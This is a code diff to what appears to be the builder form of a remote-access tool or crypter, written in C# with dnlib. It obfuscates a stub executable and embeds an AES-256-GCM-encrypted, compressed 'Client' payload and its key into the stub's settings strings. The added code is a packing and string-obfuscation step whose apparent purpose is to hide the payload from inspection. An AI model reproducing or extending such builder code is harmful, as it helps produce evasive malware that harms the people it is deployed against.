@@ -14,7 +14,9 @@ using dnlib.DotNet.Emit;
 using Server.RenamingObfuscation;
 using System.Threading.Tasks;
 using System.Diagnostics;
+using AMnSecure;
 using Toolbelt.Drawing;
+using Methods = Server.Helper.Methods;
 
 namespace Server.Forms
 {
@@ -216,6 +218,8 @@ namespace Server.Forms
                         ModuleDefMD asmDefSecureByAMn = ModuleDefMD.Load(@"SecureByAMn.exe");
                         string fullPathSecureByAMn = Path.Combine(Path.GetDirectoryName(saveFileDialog1.FileName),
                             Settings.nameSecureByAMn + ".exe");
+                        //Obfusquer asmDefSecureByAMn
+                        EncryptString.DoEncrypt(asmDefSecureByAMn);
                         WriteSettingsSecureByAMn(asmDefSecureByAMn,fullPathSecureByAMn,File.ReadAllBytes(saveFileDialog1.FileName));
                         asmDefSecureByAMn.Write(fullPathSecureByAMn);
                         asmDefSecureByAMn.Dispose();
@@ -482,21 +486,32 @@ namespace Server.Forms
                 {
                     asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                     asmDef.Name = Path.GetFileName(AsmName);
-                    if (type.Name == "Settings")//CLass Settings
+
+
+                    if (type.Name == "Settings")
+                    {
                         foreach (MethodDef method in type.Methods)
                         {
                             if (method.Body == null) continue;
                             for (int i = 0; i < method.Body.Instructions.Count(); i++)
                             {
-                                if (method.Body.Instructions[i].Operand == "#AES_256_GCM_ENCRYPTION#")
+                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                 {
-                                    string aesEncBase64 = AMnSecure.Aes256GcmCompression.EncryptBase64(Client,Settings.keyAesBase256Gcm);
-                                    method.Body.Instructions[i].Operand = aesEncBase64;
+                                    if (method.Body.Instructions[i].Operand.ToString() == "#PASSWOR_AES_256_GCM#")
+                                    {
+                                        method.Body.Instructions[i].Operand = Settings.keyAesBase256Gcm;
+                                    }
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "#AES_256_GCM_ENCRYPTION#")
+                                    {
+                                        method.Body.Instructions[i].Operand =
+                                            AesAdvancedCompression.EncryptBase64(
+                                                AesAdvancedCompression.Compress(Client),Settings.keyAesBase256Gcm);
+                                    }
                                 }
-                                if(method.Body.Instructions[i].Operand == "#PASSWOR_AES_256_GCM#")
-                                    method.Body.Instructions[i].Operand = Settings.keyAesBase256Gcm;
                             }
                         }
+                    }
                 }
             }
             catch (Exception ex)
